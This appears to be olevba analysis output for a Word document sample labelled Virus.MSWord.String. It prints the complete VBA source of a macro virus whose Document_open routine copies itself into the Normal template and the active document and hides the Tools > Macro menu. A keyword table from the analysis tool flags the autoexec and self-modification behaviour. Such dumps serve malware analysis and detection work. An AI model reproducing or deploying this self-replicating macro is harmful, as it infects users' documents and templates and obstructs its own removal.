olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.String-a3058bc399461f00ad63f76a2bd4cb12f09f4243
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.String-a3058bc399461f00ad63f76a2bd4cb12f09f4243 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'e[ax]
Private Sub Document_open()
Dim KVICKJS, CHSJEUR, LCXJSIE, OCKAJRF, SIFDMXU
Set CHSJEUR = ThisDocument.VBProject.VBComponents(1).CodeModule
Set OCKAJRF = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set LCXJSIE = ActiveDocument.VBProject.VBComponents(1).CodeModule
KVICKJS = Strings.Trim(CHSJEUR.Lines(1, CHSJEUR.CountOfLines))
SIFDMXU = Strings.LCase("'e[ax]")
If SIFDMXU <> OCKAJRF.Lines(1, 1) Then
With OCKAJRF
.DeleteLines 1, OCKAJRF.CountOfLines
.InsertLines 1, KVICKJS
End With
End If
If SIFDMXU <> LCXJSIE.Lines(1, 1) Then
With LCXJSIE
.DeleteLines 1, LCXJSIE.CountOfLines
.InsertLines 1, KVICKJS
End With
End If
With CommandBars("Tools")
.Controls("Macro").Visible = False
End With
'WM97/2K.String by e[ax]
'SIM v1.0 [String Infection Method] by e[ax]
'Greetz: k04x, rudeboy, BIGFOOOT, E-man, SnakeLord, t[r]ax
'H4dija, te ostale pri BIHnet.ORG-u
'SP.greetz to: Jackie 2Fl0wer, KnowDeath, ASMhead, Mist, mort-
'nala, Giga, LifeWire, Fluvian, Evul, and to all ppl on #virus
'10x once again for inspiration...
'VicES: Where ar u man!?
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

